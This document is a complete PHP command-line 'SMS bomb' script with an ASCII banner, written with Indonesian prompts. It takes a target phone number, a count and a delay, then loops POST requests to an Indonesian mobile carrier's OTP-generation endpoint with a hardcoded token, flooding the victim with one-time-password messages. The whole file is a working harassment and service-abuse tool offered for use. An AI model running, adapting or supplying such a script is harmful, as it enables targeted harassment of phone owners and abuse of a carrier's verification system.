<?php 
error_reporting(0);
echo "\033[1;31m[+]-==================================================-[+]\n";
echo"\t\t\033[1;33m 
  _     ___
 | |   / _ \
 | | _| | | | __ _ _______ _ __
 | |/ / | | |/ _` |_  / _ \ '__|
 |   <| |_| | (_| |/ /  __/ |
 |_|\_\\\___/ \__,_/___\___|_|
 
// Ssttt !!! be Quiet!
// Bom SMS (only three)
// CODED BY k0azer
// nhansanc3z@gmail.com\n";
echo "\033[1;31m[+]-==================================================-[+]\n\033[1;37m";
echo " \033[1;36m[\033[1;35m?\033[1;36m] Nomor Target (Ex : 089xxxxxx) => \033[1;33m";
$nomer = trim(fgets(STDIN));
if ($nomer == ''){
	die(" [!] Harap Masukkan Nomer !!");
} 
echo " \033[1;36m[\033[1;35m?\033[1;36m] Jumlah Spam => \033[1;33m";
$jumlah = trim(fgets(STDIN));
if ($jumlah == ''){
	die(" [!] Harap Masukkan Jumlah !!");
} 
echo " \033[1;36m[\033[1;35m?\033[1;36m] Delay Per Detik (1 - 999) => \033[1;33m";
$delay = trim(fgets(STDIN));
if ($delay == ''){
	die(" [!] Harap Masukkan Delay !!");
} 
echo "\n\033[1;33mReady to sending SMS...\n\n";
for($a=0;$a<$jumlah;$a++) {
$ch = curl_init();
curl_setopt ($ch, CURLOPT_URL, "https://registrasi.tri.co.id/daftar/generateOTP");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
$payload = "msisdn=$nomer&token=aUYfcfi4oDlYYmQkTlNub1Y6LvgVKuxU0";
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt ($ch, CURLOPT_POSTFIELDS, $payload);
$proxy = '204.116.211.750';
$port = '8080';
//curl_setopt($ch, CURLOPT_PROXY, "167.71.182.13");
//curl_setopt($ch, CURLOPT_PROXYPORT, "3128");
//curl_setopt($ch, CURLOPT_VERBOSE, 1);
$result = curl_exec($ch);
$tu = json_decode($result, true);
date_default_timezone_set('Asia/Jakarta'); 
$waktu = date("H:i:s");
sleep($delay);
$no = $a+1;
if ($tu[code] == '200'){
	echo "\033[1;37m[$no] \033[1;32mSUKSES KIRIM KE => $nomer \033[1;37m[$waktu]\n";
}
else if($tu[code] == '400'){
	echo "\033[1;37m[$no] \033[1;31mGAGAL KIRIM KE => $nomer - Reason : 400 Bad Request \033[1;37m[$waktu]\n";
}
else if($tu[message] == 'Silahkan masukkan nomor Tri.'){
	echo "Silahkan masukkan nomor Tri.";
}
curl_close($ch);
}
?>
